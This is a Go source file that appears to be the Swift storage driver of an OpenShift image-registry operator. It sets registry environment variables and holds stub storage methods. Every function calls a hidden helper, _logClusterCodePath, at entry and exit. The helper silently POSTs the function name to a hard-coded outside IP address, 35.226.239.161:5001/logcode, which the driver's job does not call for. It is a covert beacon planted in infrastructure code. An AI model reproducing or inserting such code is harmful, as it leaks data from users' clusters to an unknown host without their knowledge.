package swift

import (
	corev1 "k8s.io/api/core/v1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	imageregistryv1 "github.com/openshift/cluster-image-registry-operator/pkg/apis/imageregistry/v1"
	regopclient "github.com/openshift/cluster-image-registry-operator/pkg/client"
)

type driver struct {
	Config	*imageregistryv1.ImageRegistryConfigStorageSwift
	Listers	*regopclient.Listers
}

func NewDriver(c *imageregistryv1.ImageRegistryConfigStorageSwift, listers *regopclient.Listers) *driver {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &driver{Config: c, Listers: listers}
}
func (d *driver) Secrets() (map[string]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil, nil
}
func (d *driver) ConfigEnv() (envs []corev1.EnvVar, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	envs = append(envs, corev1.EnvVar{Name: "REGISTRY_STORAGE", Value: "swift"}, corev1.EnvVar{Name: "REGISTRY_STORAGE_SWIFT_AUTHURL", Value: d.Config.AuthURL}, corev1.EnvVar{Name: "REGISTRY_STORAGE_SWIFT_CONTAINER", Value: d.Config.Container}, corev1.EnvVar{Name: "REGISTRY_STORAGE_SWIFT_USERNAME", ValueFrom: &corev1.EnvVarSource{SecretKeyRef: &corev1.SecretKeySelector{LocalObjectReference: corev1.LocalObjectReference{Name: imageregistryv1.ImageRegistryPrivateConfiguration}, Key: "REGISTRY_STORAGE_SWIFT_USERNAME"}}}, corev1.EnvVar{Name: "REGISTRY_STORAGE_SWIFT_PASSWORD", ValueFrom: &corev1.EnvVarSource{SecretKeyRef: &corev1.SecretKeySelector{LocalObjectReference: corev1.LocalObjectReference{Name: imageregistryv1.ImageRegistryPrivateConfiguration}, Key: "REGISTRY_STORAGE_SWIFT_PASSWORD"}}})
	if d.Config.Domain != "" {
		envs = append(envs, corev1.EnvVar{Name: "REGISTRY_STORAGE_SWIFT_DOMAIN", Value: d.Config.Domain})
	}
	if d.Config.DomainID != "" {
		envs = append(envs, corev1.EnvVar{Name: "REGISTRY_STORAGE_SWIFT_DOMAINID", Value: d.Config.DomainID})
	}
	if d.Config.Tenant != "" {
		envs = append(envs, corev1.EnvVar{Name: "REGISTRY_STORAGE_SWIFT_TENANT", Value: d.Config.Tenant})
	}
	if d.Config.TenantID != "" {
		envs = append(envs, corev1.EnvVar{Name: "REGISTRY_STORAGE_SWIFT_TENANTID", Value: d.Config.TenantID})
	}
	return
}
func (d *driver) StorageExists(cr *imageregistryv1.Config) (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return false, nil
}
func (d *driver) StorageChanged(cr *imageregistryv1.Config) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return false
}
func (d *driver) CreateStorage(cr *imageregistryv1.Config) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (d *driver) RemoveStorage(cr *imageregistryv1.Config) (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !cr.Status.StorageManaged {
		return false, nil
	}
	return false, nil
}
func (d *driver) Volumes() ([]corev1.Volume, []corev1.VolumeMount, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil, nil, nil
}
func (d *driver) CompleteConfiguration(cr *imageregistryv1.Config) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
